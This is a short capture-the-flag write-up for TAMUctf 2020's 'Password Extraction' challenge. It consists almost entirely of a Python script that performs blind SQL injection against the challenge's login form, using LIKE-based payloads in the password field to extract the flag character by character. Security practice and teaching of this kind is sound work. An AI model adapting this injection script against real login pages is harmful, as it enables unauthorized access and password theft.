---
layout: writeup
title: Password Extraction
description: Extract the pass with SQLi
categories: [writeups]
tags: [TAMUctf 2020, web]
---

# Password Extraction

```python
#!/usr/bin/env python3
import requests

url = 'http://passwordextraction.tamuctf.com/login.php'

data = {'username':'admin','password':''}

flag = ''

possible=''
for char in 'qwertyuiopasdfghjklzxcvbnm1234567890{QWERTYUIOPASDFGHJKLZXCVBNM}':
    data['password']="' or password like '%"+char+"%"
    res = requests.post(url=url,data=data)
    #print(res.text)
    if 'success' in res.text:
        possible+=char

print('Character set: '+''.join(sorted(list(possible))))
length = 40
for i in range(length):
    for char in possible:
        data['password']="' or password like '"+flag+char+"%"
        if 'success' in requests.post(url=url,data=data).text:
            flag += char
            break
    print(flag)
    if '}' in flag:
        break
```
